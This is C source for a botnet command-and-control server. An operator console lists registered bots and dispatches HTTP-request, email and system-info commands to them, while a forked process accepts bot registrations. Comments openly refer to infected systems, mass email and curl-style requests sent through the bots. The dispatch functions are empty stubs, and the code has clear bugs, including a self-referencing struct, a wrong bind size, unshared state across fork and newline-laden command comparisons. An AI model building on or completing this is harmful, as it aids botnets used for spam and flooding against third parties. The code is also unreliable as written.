#include <sys/types.h> /* See NOTES */
#include <sys/socket.h>
#include "common.h"
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <arpa/inet.h>  // htons()
#include <netinet/in.h> // struct sockaddr_in
#include <sys/socket.h>
#include <stdio.h>
#include <stdbool.h>

// BRAINSTORMING

/*
    p1 -> always on, get commands from cli and execute them
    p2 -> alway on, accept connections from bot in order to register themc -> P2_CONN TCP

    p1 and p2 need to access a shared resource (active_bots):
    - p2 write on in -> producer
    - p1 read from it and update its contents -> consumer

    should I create a c1 process (child of p1)  or a p3 process
    that leaves a open UDP connection in order 
    to update bots active state?

    active_bots -> Critical section
    botExists, list_botnet , sendCommand -> unsafe for now
*/


// BOT -> Critical section
typedef struct
{
    int bot_id;
    unsigned short int ports[3];
    struct sockaddr_in bot_address; // in_addr ?

    // If these two fields are not null the bot is active else not
    struct in_addr target_address;
    char action[10];

    active_bots *next;
} active_bots;

active_bots *botnet;

bool botExists(int bot_id);
void list_botnet(bool active);
void sendCommand(char* command, int bot_id);

int main(int argc, char const *argv[])
{
    /* Accept connections from bots

        accept
        receive info and save them in active_bots;
        send close message
        close connection
    */

    int sock_fd, bot_fd, ret, pid;
    struct sockaddr_in server_addr = {0}, client_addr = {0};
    int sockaddr_len = sizeof(struct sockaddr_in);

    botnet = (struct active_bots *)malloc(sizeof(active_bots));
    botnet->next = NULL;

    sock_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (sock_fd < 0)
    {
        handle_error("Socket not initialized");
    }

    printf("Socket created");

    server_addr.sin_addr.s_addr = INADDR_ANY; // we want to accept connections from any interface
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);

    ret = bind(sock_fd, (struct sockaddr *)&server_addr, sizeof(sockaddr_len));
    if (ret < 0)
    {
        handle_error("Cannot bind address to socket");
    }

    ret = listen(sock_fd, MAX_CONN_QUEUE);
    if (ret < 0)
    {
        handle_error("Listen on socket error");
    }

    pid = fork();
    if (pid < 0)
    {
        handle_error("cannot fork");
    }
    else if (pid == 0)
    {
        printf("Child process working,handle bot connection");
        /*TODO 
            accept connections,
             store bot info into active_bots  -> concurrent programming, the botnet struct is the critical section
             PRODUCER
             close connection

        */
        while (1)
            {

                bot_fd = accept(sock_fd, (struct sockaddr *)&client_addr, (socklen_t *)&sockaddr_len);
                if (bot_fd < 0)
                    handle_error("Cannot open socket for incoming connection");

                // invoke the connection_handler() method to process the request
                fprintf(stderr, "Incoming connection accepted...\n");

                /*

                    sem_post
                    storeBot
                    sem_wait
                */
                
                connection_handler(bot_fd);

                fprintf(stderr, "Done!\n");
            }
    }
    else
    {
        printf("Parent process working, send commands ");

        while (1)
        {

            char command[10];
            fgets(command, 10, stdin);

            printf("Insert Command : \n");

            if (strcmp(command, LIST) == 0)
            {
                printf("Listing active bots of current botnet");
                // sem_wait
                list_botnet(true);
                // sem_post
            }

            if (strcmp(command, QUIT) == 0)
            {
                printf("Stop C&C");
                free(botnet);
                exit(EXIT_SUCCESS);
            }
            // maybe just one or multiple | statements

            if (strcmp(command, HTTP_REQ) == 0 | strcmp(command, EMAIL) == 0 | strcmp(command, SYS_INFO) == 0)
            {
                printf("Choose bot to which send command");
                
                // sem_wait
                list_botnet(false);
                // sem_post

                char bot_id[100];
                fgets(bot_id,100,stdin);
                int bot = atoi(bot_id);

                if(botExists(bot) == false){
                    printf("Not a valid bot id");
                    continue;
                }else{
                    sendCommand(command, bot);
                }


            }
            else
            {
                printf("Error, command not supported choose one from the following available commands: \n %s \n %s \n %s \n %s \n ",
                       HTTP_REQ, LIST, EMAIL, SYS_INFO);

                continue;
            }
        }
    }

    

    return 0;
}

/*
    active == true -> list active bots
    active == false -> list all registered bots
*/
void list_botnet(bool active)
{

    active_bots *bot = botnet;

    while (bot != NULL)
    {
        if (active == true)
        {

            char bot_ip[INET_ADDRSTRLEN];
            char target_ip[INET_ADDRSTRLEN];
            inet_ntop(bot->bot_address.sin_family, &(bot->bot_address.sin_addr), bot_ip, INET_ADDRSTRLEN);
            inet_ntop(bot->bot_address.sin_family, &(bot->target_address), target_ip, INET_ADDRSTRLEN);

            printf("BOT_ID: %d - IP: %s - ACTION: %s  - TARGET: %s \n", bot->bot_id, bot_ip, bot->action, target_ip);
        }
        else
        {
            printf("BOT_ID: %d \n", bot->bot_id);
        }

        bot = bot->next;
    }
}

bool botExists(int bot_id){
    active_bots *bot = botnet;

    while (bot != NULL)
    {
        if( bot->bot_id == bot_id){
            return true;
        }


        bot = bot->next;
    }
    return false;
}

/* 
* Instanciate TCP connection in order to track current bots -> another fork?
* email -> send array of email addresses, content 
* HTTP_REQ -> send http request as string "e.g curl ..." 
* SYS_INFO -> nothing
*/
void sendCommand(char* command, int bot_id){


    if (strcmp(command, HTTP_REQ) == 0){
      printf("Sending http request ");

      return;
    }

    if( strcmp(command, EMAIL) == 0){
      printf("Sending emails ");
        // TODO from: to: subject: content:
      return;
    }
    if(strcmp(command, SYS_INFO) == 0){
      printf("Retrieving infected system info ");

      return;
    }



}
